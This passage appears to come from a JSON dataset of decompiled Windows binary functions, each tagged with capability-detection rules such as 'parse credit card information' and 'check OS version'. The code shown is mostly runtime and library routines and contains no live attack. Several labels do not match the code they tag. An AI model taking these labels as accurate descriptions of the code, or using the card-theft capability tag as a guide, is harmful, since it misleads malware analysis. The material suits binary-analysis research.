8:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 3;\n                break;\n            case 0xb:\n            case 0xc:\n                unaff_EDI = *(in_EAX + 1);\n                puVar8 = in_EAX + 9;\n                break;\n            case 0xd:\n                unaff_EDI = NULL;\n                uVar10 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar11 = *puVar13;\n                    uVar2 = uVar10 & 0x1f;\n                    uVar10 = uVar10 + 7;\n                    unaff_EDI = unaff_EDI | (uVar11 & 0x7f) << uVar2;\n                    puVar13 = puVar8;\n                } while (uVar11 < '\\0');\n                break;\n            case 0xe:\n                unaff_EDI = NULL;\n                uVar7 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar10 = *puVar13;\n                    uVar11 = uVar7;\n                    uVar7 = uVar7 + 7;\n                    unaff_EDI = unaff_EDI | (uVar10 & 0x7f) << (uVar11 & 0x1f);\n                    puVar13 = puVar8;\n                } while (uVar10 < '\\0');\n                if ((uVar7 < 0x20) && ((uVar10 & 0x40) != 0)) {\n                    unaff_EDI = unaff_EDI | -(1 << (uVar7 & 0x1f));\n                }\n                break;\n            case 0xf:\n                if (ppiStack312 == NULL) goto code_r0x004014e0;\n                unaff_EDI = (&piStack292)[ppiStack312 + 1];\n                break;\n            case 0x10:\n                if (ppiStack312 != NULL) {\n                    ppiStack312 = ppiStack312 + -1;\n                    goto code_r0x004395a4;\n                }\n                goto code_r0x004014e0;\n            case 0x11:\n                if (ppiStack312 < 2) goto code_r0x004014e0;\n                unaff_EDI = (&piStack292)[ppiStack312];\n                break;\n            case 0x12:\n                puVar8 = in_EAX + 2;\n                if (ppiStack312 + -1 <= in_EAX[1]) goto code_r0x004014e0;\n                unaff_EDI = apiStack284[(ppiStack312 + -1) - in_EAX[1]];\n                break;\n            case 0x13:\n                if (1 < ppiStack312) {\n                    piVar6 = apiStack284[ppiStack312 + -1];\n                    apiStack284[ppiStack312 + -1] = apiStack284[ppiStack312 + -2];\n                    apiStack284[ppiStack312 + -2] = piVar6;\n                    goto code_r0x004395a4;\n                }\n                goto code_r0x004014e0;\n            case 0x14:\n                if (2 < ppiStack312) {\n                    piVar6 = apiStack284[ppiStack312 + -1];\n                    unaff_EBP = apiStack284[ppiStack312 + -2];\n                    unaff_EDI = apiStack284[ppiStack312 + -3];\n                    apiStack284[ppiStack312 + -1] = unaff_EBP;\n                    apiStack284[ppiStack312 + -2] = unaff_EDI;\n                    apiStack284[ppiStack312 + -3] = piVar6;\n                    goto code_r0x004395a4;\n                }\n                goto code_r0x004014e0;\n            case 0x17:\n            case 0x18:\n            case 0x19:\n            case 0x1a:\n            case 0x1b:\n            case 0x1e:\n            case 0x1f:\n            case 0x21:\n            case 0x22:\n            case 0x23:\n            case 0x24:\n            case 0x26:\n            case 0x27:\n            case 0x28:\n            case 0x29:\n            case 0x2a:\n            case 0x2b:\n                if (ppiStack312 < 2) goto code_r0x004014e0;\n                unaff_EBP = ppiStack312 + -2;\n                ppiVar1 = (&piStack292)[ppiStack312 + 1];\n                unaff_EDI = apiStack284[unaff_EBP];\n                uVar10 = ppiVar1;\n                ppiStack312 = unaff_EBP;\n    // switch table (21 cases) at 0x52716c\n                switch(uVar7 - 0x1a & 0xff) {\n                case 0:\n                    unaff_EDI = unaff_EDI & ppiVar1;\n                    break;\n                case 1:\n                    unaff_EDI = unaff_EDI / ppiVar1;\n                    break;\n                case 2:\n                    unaff_EDI = unaff_EDI - ppiVar1;\n                    break;\n                case 3:\n                    unaff_EDI = unaff_EDI % ppiVar1;\n                    break;\n                case 4:\n                    unaff_EDI = unaff_EDI * ppiVar1;\n                    break;\n                default:\n                    goto code_r0x00439a29;\n                case 7:\n                    unaff_EDI = unaff_EDI | ppiVar1;\n                    break;\n                case 8:\n                    unaff_EDI = unaff_EDI + ppiVar1;\n                    break;\n                case 10:\n                    unaff_EDI = unaff_EDI << (uVar10 & 0x1f);\n                    break;\n                case 0xb:\n                    unaff_EDI = unaff_EDI >> (uVar10 & 0x1f);\n                    break;\n                case 0xc:\n                    unaff_EDI = unaff_EDI >> (uVar10 & 0x1f);\n                    break;\n                case 0xd:\n                    unaff_EDI = unaff_EDI ^ ppiVar1;\n                    break;\n                case 0xf:\n                    unaff_EDI = unaff_EDI == ppiVar1;\n                    break;\n                case 0x10:\n                    unaff_EDI = ppiVar1 <= unaff_EDI;\n                    break;\n                case 0x11:\n                    unaff_EDI = ppiVar1 < unaff_EDI;\n                    break;\n                case 0x12:\n                    unaff_EDI = unaff_EDI <= ppiVar1;\n                    break;\n                case 0x13:\n                    unaff_EDI = unaff_EDI < ppiVar1;\n                    break;\n                case 0x14:\n                    unaff_EDI = unaff_EDI != ppiVar1;\n                }\n                break;\n            case 0x25:\n                if (ppiStack312 != NULL) {\n                    unaff_EDI = ppiStack312 + -1;\n                    puVar8 = in_EAX + 3;\n                    ppiStack312 = unaff_EDI;\n                    if (apiStack284[unaff_EDI] != NULL) {\n                        puVar8 = puVar8 + *(in_EAX + 1);\n                    }\n                    goto code_r0x004395a4;\n                }\n                goto code_r0x004014e0;\n            case 0x2c:\n                puVar8 = in_EAX + *(in_EAX + 1) + 3;\n                goto code_r0x004395a4;\n            case 0x2d:\n            case 0x2e:\n            case 0x2f:\n            case 0x30:\n            case 0x31:\n            case 0x32:\n            case 0x33:\n            case 0x34:\n            case 0x35:\n            case 0x36:\n            case 0x37:\n            case 0x38:\n            case 0x39:\n            case 0x3a:\n            case 0x3b:\n            case 0x3c:\n            case 0x3d:\n            case 0x3e:\n            case 0x3f:\n            case 0x40:\n            case 0x41:\n            case 0x42:\n            case 0x43:\n            case 0x44:\n            case 0x45:\n            case 0x46:\n            case 0x47:\n            case 0x48:\n            case 0x49:\n            case 0x4a:\n            case 0x4b:\n            case 0x4c:\n                unaff_EDI = uVar7 - 0x30;\n                break;\n            case 0x4d:\n            case 0x4e:\n            case 0x4f:\n            case 0x50:\n            case 0x51:\n            case 0x52:\n            case 0x53:\n            case 0x54:\n            case 0x55:\n            case 0x56:\n            case 0x57:\n            case 0x58:\n            case 0x59:\n            case 0x5a:\n            case 0x5b:\n            case 0x5c:\n            case 0x5d:\n            case 0x5e:\n            case 0x5f:\n            case 0x60:\n            case 0x61:\n            case 0x62:\n            case 99:\n            case 100:\n            case 0x65:\n            case 0x66:\n            case 0x67:\n            case 0x68:\n            case 0x69:\n            case 0x6a:\n            case 0x6b:\n            case 0x6c:\n                iVar4 = uVar7 - 0x50;\n                if (0x11 < iVar4) goto code_r0x004014e0;\n                unaff_EDI = *(param_1 + iVar4 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + iVar4) == '\\0')) {\n                    if (*(uVar7 + 0x56b3a4) != '\\x04') goto code_r0x004014e0;\ncode_r0x004396ec:\n                    unaff_EDI = *unaff_EDI;\n                }\n                break;\n            case 0x6d:\n            case 0x6e:\n            case 0x6f:\n            case 0x70:\n            case 0x71:\n            case 0x72:\n            case 0x73:\n            case 0x74:\n            case 0x75:\n            case 0x76:\n            case 0x77:\n            case 0x78:\n            case 0x79:\n            case 0x7a:\n            case 0x7b:\n            case 0x7c:\n            case 0x7d:\n            case 0x7e:\n            case 0x7f:\n            case 0x80:\n            case 0x81:\n            case 0x82:\n            case 0x83:\n            case 0x84:\n            case 0x85:\n            case 0x86:\n            case 0x87:\n            case 0x88:\n            case 0x89:\n            case 0x8a:\n            case 0x8b:\n            case 0x8c:\n                uVar14 = 0;\n                uVar12 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar10 = *puVar13;\n                    uVar11 = uVar12;\n                    uVar12 = uVar12 + 7;\n                    uVar14 = uVar14 | (uVar10 & 0x7f) << (uVar11 & 0x1f);\n                    puVar13 = puVar8;\n                } while (uVar10 < '\\0');\n                if ((uVar12 < 0x20) && ((uVar10 & 0x40) != 0)) {\n                    uVar14 = uVar14 | -(1 << (uVar12 & 0x1f));\n                }\n                iVar4 = uVar7 - 0x70;\n                if (0x11 < iVar4) goto code_r0x004014e0;\n                puVar9 = *(param_1 + iVar4 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + iVar4) == '\\0')) {\n                    if (*(uVar7 + 0x56b384) != '\\x04') goto code_r0x004014e0;\n                    puVar9 = *puVar9;\n                }\n                unaff_EDI = puVar9 + uVar14;\n                break;\n            case 0x8d:\n                uVar7 = 0;\n                uVar10 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar11 = *puVar13;\n                    uVar2 = uVar10 & 0x1f;\n                    uVar10 = uVar10 + 7;\n                    uVar7 = uVar7 | (uVar11 & 0x7f) << uVar2;\n                    puVar13 = puVar8;\n                } while (uVar11 < '\\0');\n                if (0x11 < uVar7) goto code_r0x004014e0;\n                unaff_EDI = *(param_1 + uVar7 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + uVar7) == '\\0')) {\n                    if (*(uVar7 + 0x56b3f4) == '\\x04') goto code_r0x004396ec;\n                    goto code_r0x004014e0;\n                }\n                break;\n            case 0x8f:\n                uVar7 = 0;\n                uVar10 = 0;\n                do {\n                    puVar13 = puVar8 + 1;\n                    uVar11 = *puVar8;\n                    uVar2 = uVar10 & 0x1f;\n                    uVar10 = uVar10 + 7;\n                    uVar7 = uVar7 | (uVar11 & 0x7f) << uVar2;\n                    puVar8 = puVar13;\n                } while (uVar11 < '\\0');\n                uVar14 = 0;\n                uVar12 = 0;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar10 = *puVar13;\n                    uVar11 = uVar12;\n                    uVar12 = uVar12 + 7;\n                    uVar14 = uVar14 | (uVar10 & 0x7f) << (uVar11 & 0x1f);\n                    puVar13 = puVar8;\n                } while (uVar10 < '\\0');\n                if ((uVar12 < 0x20) && ((uVar10 & 0x40) != 0)) {\n                    uVar14 = uVar14 | -(1 << (uVar12 & 0x1f));\n                }\n                if (0x11 < uVar7) goto code_r0x004014e0;\n                puVar9 = *(param_1 + uVar7 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + uVar7) == '\\0')) {\n                    if (*(uVar7 + 0x56b3f4) != '\\x04') goto code_r0x004014e0;\n                    puVar9 = *puVar9;\n                }\n                unaff_EDI = uVar14 + puVar9;\n                break;\n            case 0x93:\n                goto code_r0x004395a4;\n            case 0xee:\n                fcn.00438670();\n                puVar8 = fcn.00438530(&piStack292 + 1);\n                unaff_EDI = ppiStack288;\n            }\ncode_r0x00439590:\n            if (0x3f < ppiStack312) goto code_r0x004014e0;\n            apiStack284[ppiStack312] = unaff_EDI;\n            unaff_EBP = ppiStack312;\n            ppiStack312 = ppiStack312 + 1;\ncode_r0x004395a4:\n            in_EAX = puVar8;\n        } while (puVar8 < param_2);\n        if (ppiStack312 == NULL) {\ncode_r0x004014e0:\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar4 == 0) {\n                *0x4ce004 = 0x43c000;\n                pcVar5 = 0x43bdb0;\n            }\n            else {\n                *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, \"__register_frame_info\");\n                *0x4ce004 = (*pcVar3)(iVar4, \"__deregister_frame_info\");\n            }\n            if (pcVar5 != NULL) {\n                (*pcVar5)(0x52e0f8, 0x56b01c);\n            }\n            piVar6 = fcn.004014c0(fcn.00401590);\n            return piVar6;\n        }\n        param_3 = (&piStack292)[ppiStack312 + 1];\n    }\n    return param_3;\n}\n",
        "token_count": 5301
    },
    "00440070": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.00440070(int32_t param_1, int32_t param_2)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    ushort *puVar7;\n    ushort *puVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    iVar2 = param_2;\n    if (*(param_2 + 0x10) <= *(param_1 + 0x10)) {\n        param_2 = param_1;\n        param_1 = iVar2;\n    }\n    puVar10 = param_1 + 0x14;\n    uVar9 = 0;\n    iVar6 = fcn.00445f30(*(param_2 + 4));\n    iStack36 = *(param_2 + 0x10);\n    *(iVar6 + 0x10) = iStack36;\n    iVar2 = *(param_1 + 0x10);\n    puVar1 = iVar6 + 0x14 + iVar2 * 2;\n    puVar11 = param_2 + 0x14;\n    puVar7 = iVar6 + 0x14;\n    do {\n        uVar3 = *puVar11;\n        uVar4 = *puVar10;\n        puVar11 = puVar11 + 1;\n        puVar10 = puVar10 + 1;\n        puVar8 = puVar7 + 2;\n        uVar9 = (uVar4 & 0xffff) + (uVar3 & 0xffff) + uVar9;\n        *puVar7 = uVar9;\n        uVar9 = (uVar3 >> 0x10) + (uVar4 >> 0x10) + (uVar9 >> 0x10);\n        puVar7[1] = uVar9;\n        uVar9 = uVar9 >> 0x10;\n        puVar7 = puVar8;\n    } while (puVar8 < puVar1);\n    iVar5 = *(param_2 + 0x10);\n    for (; puVar8 < puVar1 + (iVar5 - iVar2) * 2; puVar8 = puVar8 + 2) {\n        uVar3 = *puVar11;\n        puVar11 = puVar11 + 1;\n        uVar9 = (uVar3 & 0xffff) + uVar9;\n        *puVar8 = uVar9;\n        uVar9 = (uVar3 >> 0x10) + (uVar9 >> 0x10);\n        puVar8[1] = uVar9;\n        uVar9 = uVar9 >> 0x10;\n    }\n    iStack40 = iVar6;\n    if (uVar9 != 0) {\n        if (iStack36 == *(iVar6 + 8)) {\n            iStack40 = fcn.00445f30(*(iVar6 + 4) + 1);\n            sub.msvcrt.dll_memcpy(iStack40 + 0xc, iVar6 + 0xc, *(iVar6 + 0x10) * 4 + 8);\n            fcn.00446000(iVar6);\n            iStack36 = *(iStack40 + 0x10);\n        }\n        *(iStack40 + 0x10) = iStack36 + 1;\n        *(iStack40 + 0x14 + iStack36 * 4) = 1;\n    }\n    return iStack40;\n}\n",
        "token_count": 816
    },
    "004364b0": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004364b0(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char cVar4;\n    uchar uVar5;\n    char *pcVar6;\n    uchar *puVar7;\n    \n    pcVar6 = **(param_1 + 8);\n    if (*pcVar6 != 'f') {\n        return 0;\n    }\n    uVar1 = *(in_EAX + 0x124);\n    *(in_EAX + 0x124) = 0xffffffff;\n    cVar4 = pcVar6[1];\n    if (cVar4 == 'R') {\ncode_r0x00436674:\n        if (*(in_EAX + 0x100) == 0xff) {\n            *(in_EAX + 0xff) = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *(in_EAX + 0x100) = 0;\n        }\n        iVar3 = *(in_EAX + 0x100);\n        *(in_EAX + 0x100) = iVar3 + 1;\n        *(in_EAX + iVar3) = 0x28;\n        *(in_EAX + 0x104) = 0x28;\n        fcn.004363c0();\n        puVar7 = 0x52548c;\n        fcn.00436320();\n        uVar5 = 0x2e;\n        iVar3 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar3 == 0xff) {\n                *(in_EAX + 0xff) = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar2 = 1;\n                iVar3 = 0;\n            }\n            else {\n                iVar2 = iVar3 + 1;\n            }\n            puVar7 = puVar7 + 1;\n            *(in_EAX + 0x100) = iVar2;\n            *(in_EAX + iVar3) = uVar5;\n            *(in_EAX + 0x104) = uVar5;\n            if (puVar7 == 0x52548f) break;\n            uVar5 = *puVar7;\n            iVar3 = iVar2;\n        }\n        fcn.00436320();\n    }\n    else {\n        if (cVar4 < 'S') {\n            if (cVar4 != 'L') goto code_r0x00436650;\n            goto code_r0x00436674;\n        }\n        if (cVar4 != 'l') {\n            if (cVar4 == 'r') {\n                iVar2 = *(in_EAX + 0x100);\n                iVar3 = iVar2 + 1;\n                if (iVar2 == 0xff) {\n                    *(in_EAX + 0xff) = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar3 = 1;\n                    iVar2 = 0;\n                }\n                *(in_EAX + 0x100) = iVar3;\n                pcVar6 = \"...)\";\n                *(in_EAX + iVar2) = 0x28;\n                *(in_EAX + 0x104) = 0x28;\n                fcn.004363c0();\n                fcn.00436320();\n                cVar4 = '.';\n                iVar3 = *(in_EAX + 0x100);\n                while( true ) {\n                    if (iVar3 == 0xff) {\n                        *(in_EAX + 0xff) = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar2 = 1;\n                        iVar3 = 0;\n                    }\n                    else {\n                        iVar2 = iVar3 + 1;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    *(in_EAX + 0x100) = iVar2;\n                    *(in_EAX + iVar3) = cVar4;\n                    *(in_EAX + 0x104) = cVar4;\n                    if (pcVar6 == \"\") break;\n                    cVar4 = *pcVar6;\n                    iVar3 = iVar2;\n                }\n            }\n            goto code_r0x00436650;\n        }\n        pcVar6 = \"(...\";\n        cVar4 = '(';\n        iVar3 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar3 == 0xff) {\n                *(in_EAX + 0xff) = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar2 = 1;\n                iVar3 = 0;\n            }\n            else {\n                iVar2 = iVar3 + 1;\n            }\n            pcVar6 = pcVar6 + 1;\n            *(in_EAX + 0x100) = iVar2;\n            *(in_EAX + iVar3) = cVar4;\n            *(in_EAX + 0x104) = cVar4;\n            if (pcVar6 == \"\") break;\n            cVar4 = *pcVar6;\n            iVar3 = iVar2;\n        }\n        fcn.00436320();\n    }\n    fcn.004363c0();\n    iVar2 = *(in_EAX + 0x100);\n    iVar3 = iVar2 + 1;\n    if (iVar2 == 0xff) {\n        *(in_EAX + 0xff) = 0;\n        (**(in_EAX + 0x108))();\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n        iVar3 = 1;\n        iVar2 = 0;\n    }\n    *(in_EAX + 0x100) = iVar3;\n    *(in_EAX + iVar2) = 0x29;\n    *(in_EAX + 0x104) = 0x29;\ncode_r0x00436650:\n    *(in_EAX + 0x124) = uVar1;\n    return 1;\n}\n",
        "token_count": 1454
    },
    "00490280": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00490280(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = (param_3 & 0x3d) - 1;\n    if (((uVar2 < 0x3c) && (iVar1 = *(uVar2 * 4 + 0x527aa0),  iVar1 != 0)) && (*param_1 == 0)) {\n        iVar1 = fcn.0043d910(param_2, iVar1);\n        *param_1 = iVar1;\n        if (iVar1 != 0) {\n            *(param_1 + 1) = 1;\n            return param_1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 186
    },
    "0043c6d0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nfloat10 fcn.0043c6d0(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uStack36;\n    uint32_t uStack32;\n    int32_t iStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    uVar1 = fcn.0043e4f0(param_1, param_2, 0x515a50, &iStack24, &uStack20);\n    // switch table (7 cases) at 0x527214\n    switch(uVar1 & 7) {\n    case 0:\n    case 6:\n        uStack36 = 0;\n        uStack32 = 0;\n        break;\n    case 1:\n        uStack36 = uStack20;\n        uStack32 = (iStack24 + 0x433) * 0x100000 | uStack16 & 0xffefffff;\n        break;\n    case 2:\n        uStack36 = uStack20;\n        uStack32 = uStack16;\n        break;\n    case 3:\n        uStack36 = 0;\n        uStack32 = 0x7ff00000;\n        break;\n    case 4:\n        uStack36 = 0;\n        uStack32 = 0x7ff80000;\n        break;\n    case 5:\n        uStack32 = uStack16 | 0x7ff00000;\n        uStack36 = uStack20;\n    }\n    if ((uVar1 & 8) != 0) {\n        uStack32 = uStack32 | 0x80000000;\n    }\n    return CONCAT44(uStack32, uStack36);\n}\n",
        "token_count": 373
    },
    "004c33d0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nint32_t fcn.004c33d0(int32_t *param_1, int32_t param_2, uint param_3, int32_t param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t *unaff_EBX;\n    int32_t iVar4;\n    uint32_t uStack64;\n    uint uStack20;\n    \n    piVar1 = *(*param_1 + -4);\n    piVar3 = *(*param_1 + -8) + param_1;\n    if ((*(*piVar3 + -4) == piVar1) &&\n       (iVar4 = param_4,  (**(*piVar1 + 0x1c))(param_4, 6, param_3, piVar3),  param_2 != 0)) {\n        if ((uStack64 & 6) == 6) {\n            return param_2;\n        }\n        if (uStack64 == 0) {\n            if (param_4 < 0) {\n                if ((param_4 != -2) &&\n                   (uVar2 = (**(*unaff_EBX + 0x20))(param_4, param_2, uStack20, param_1),  (uVar2 & 6) == 6)) {\n                    return iVar4;\n                }\n            }\n            else if (param_1 == param_4 + param_2) {\n                return param_2;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 340
    },
    "00437000": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00437000(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x56b048 != 0) {\n        return;\n    }\n    *0x56b048 = 1;\n    iVar2 = *0x4c5700;\n    if (*0x4c5700 == -1) {\n        iVar1 = 0;\n        do {\n            iVar2 = iVar1;\n            iVar1 = iVar2 + 1;\n        } while (*((iVar2 + 1) * 4 + 0x4c5700) != 0);\n    }\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        (**(iVar2 * 4 + 0x4c5700))();\n    }\n    fcn.004014c0(0x436f70);\n    return;\n}\n",
        "token_count": 194
    },
    "0043c3a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0043c3a0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    *0x56b424 = 0xffffffff;\n    *0x56b428 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        *0x56b420 = iVar3;\n        iVar3 = fcn.004470d0(iVar3, 0x43c2c0);\n    }\n    if (iVar3 == 0) {\n        return;\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ce004 = 0x43c000;\n        pcVar2 = 0x43bdb0;\n    }\n    else {\n        *0x56bdf0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ce004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x52e0f8, 0x56b01c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 409
    },
    "0043c880": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0043c880(int32_t param_1)\n\n{\n    uint uVar1;\n    uchar uStack15;\n    ushort auStack14 [7];\n    \n    uVar1 = 0xffffffff;\n    if (param_1 != -1) {\n        uStack15 = param_1;\n        auStack14[0] = 0xffff;\n        uVar1 = fcn.00447090();\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar1, 8, &uStack15, 1, auStack14);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "0043dfb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0043dfb0(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(param_1 + 0x10);\n    piVar2 = param_1 + 0x14;\n    do {\n        if (*piVar2 != -1) {\n            *piVar2 = *piVar2 + 1;\n            return param_1;\n        }\n        piVar1 = piVar2 + 1;\n        *piVar2 = 0;\n        piVar2 = piVar1;\n    } while (piVar1 < param_1 + 0x14 + iVar4);\n    iVar3 = param_1;\n    if (*(param_1 + 8) <= iVar4) {\n        iVar3 = fcn.00445f30(*(param_1 + 4) + 1);\n        sub.msvcrt.dll_memcpy(iVar3 + 0xc, param_1 + 0xc, *(param_1 + 0x10) * 4 + 8);\n        fcn.00446000(param_1);\n        iVar4 = *(iVar3 + 0x10);\n    }\n    *(iVar3 + 0x10) = iVar4 + 1;\n    *(iVar3 + 0x14 + iVar4 * 4) = 1;\n    return iVar3;\n}\n",
        "token_count": 322
    },
    "004420a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __thiscall fcn.004420a0(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    bool bVar9;\n    int64_t iVar10;\n    int32_t aiStack80 [8];\n    uint uStack48;\n    char *pcStack44;\n    char *pcStack40;\n    char *pcStack36;\n    uint32_t uStack32;\n    \n    pcStack44 = param_1 + -1;\n    pcStack40 = pcStack44 >> 0x1f;\n    iVar7 = 1;\n    pcVar4 = pcStack44;\n    while (pcVar4 = pcVar4 / 10,  pcVar4 != NULL) {\n        iVar7 = iVar7 + 1;\n    }\n    iVar3 = *(param_2 + 0x28);\n    if (iVar3 == -1) {\n        *(param_2 + 0x28) = 2;\n        iVar3 = 2;\n    }\n    if (iVar7 <= iVar3) {\n        iVar7 = iVar3;\n    }\n    iVar3 = *(param_2 + 8) - (iVar7 + 2);\n    if (*(param_2 + 8) <= iVar7 + 2) {\n        iVar3 = -1;\n    }\n    *(param_2 + 8) = iVar3;\n    aiStack80[5] = param_2;\n    aiStack80[4] = 0x442139;\n    fcn.00441960();\n    *(param_2 + 0xc) = *(param_2 + 0x28);\n    *(param_2 + 4) = *(param_2 + 4) | 0x1c0;\n    aiStack80[4] = 0x44215a;\n    fcn.00441540();\n    *(param_2 + 8) = *(param_2 + 8) + iVar7 + 1;\n    pcStack36 = pcStack44;\n    aiStack80[6] = *(param_2 + 0xc);\n    uStack32 = pcStack40;\n    pcStack44 = *(param_2 + 4);\n    aiStack80[5] = *(param_2 + 8);\n    aiStack80[0] = 0x441df2;\n    iVar7 = fcn.00437ed0();\n    iVar7 = -iVar7;\n    pcStack40 = &stack0xffffffd3 + iVar7 & 0xfffffff0;\n    if ((pcStack44 & 0x80) != 0) {\n        if (uStack32 < 0) {\n            bVar9 = pcStack36 != NULL;\n            pcStack36 = -pcStack36;\n            uStack32 = -(uStack32 + bVar9);\n        }\n        else {\n            pcStack44 = pcStack44 & 0xffffff7f;\n            *(param_2 + 4) = pcStack44;\n        }\n    }\n    iVar10 = CONCAT44(uStack32, pcStack36);\n    uStack48 = pcStack44 & 0x1000;\n    pcVar4 = pcStack40;\n    if ((uStack32 | pcStack36) != 0) {\n        aiStack80[7] = param_2;\n        pcStack36 = pcStack40;\n        while( true ) {\n            pcVar5 = pcStack36;\n            uVar8 = iVar10 >> 0x20;\n            *(&stack0xffffffb4 + iVar7) = iVar10;\n            *(&stack0xffffffb8 + iVar7) = uVar8;\n            *(&stack0xffffffbc + iVar7) = 10;\n            *(&stack0xffffffc0 + iVar7) = 0;\n            pcStack36 = pcVar5 + 1;\n         